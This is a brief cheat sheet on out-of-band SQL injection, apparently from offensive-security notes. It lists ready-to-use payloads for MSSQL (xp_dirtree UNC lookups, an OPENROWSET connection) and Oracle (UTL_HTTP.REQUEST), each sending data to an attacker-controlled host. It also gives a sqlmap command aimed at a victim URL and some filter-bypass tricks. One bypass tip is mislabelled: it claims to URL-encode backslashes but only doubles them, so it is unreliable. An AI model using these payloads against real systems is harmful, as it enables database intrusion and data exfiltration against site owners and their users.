Out-of-Band (OOB) SQLi

Idea: Data is sent to an attacker-controlled server (DNS/HTTP). Useful when no error, no delay, no output.

Manual Payload Example (MSSQL):

'; exec xp_dirtree '\\attacker.com\share'--


DB tries to connect to attacker.com â€” leaks info to your server.

sqlmap Command:

sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=O --dns-domain=attacker.com


-------------------------------------------------------------------------------------------------------------------------

Out-of-Band (OOB) SQLi

Normal Payload:

'; exec xp_dirtree '\\attacker.com\share'--


Bypass Tricks:

Encode the backslashes (%5C):

'; exec xp_dirtree '\\\\attacker.com\\share'--


Use OPENROWSET:

'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pass','SELECT 1')--


For Oracle:

' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual--
